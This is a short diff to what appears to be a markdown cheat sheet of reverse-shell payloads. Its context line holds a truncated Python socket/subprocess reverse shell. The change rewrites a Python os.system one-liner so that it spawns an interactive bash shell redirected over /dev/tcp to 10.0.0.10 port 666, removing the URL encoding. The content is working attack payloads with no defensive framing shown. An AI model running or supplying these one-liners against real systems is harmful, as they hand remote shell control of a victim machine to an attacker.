@@ -41,7 +41,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 _or_
 ```
-__import__("os").system("bash+-c+'bash+-i+>& /dev/tcp/10.0.0.10/666 0>&1'")
+__import__("os").system("bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'")
 ```
 
 
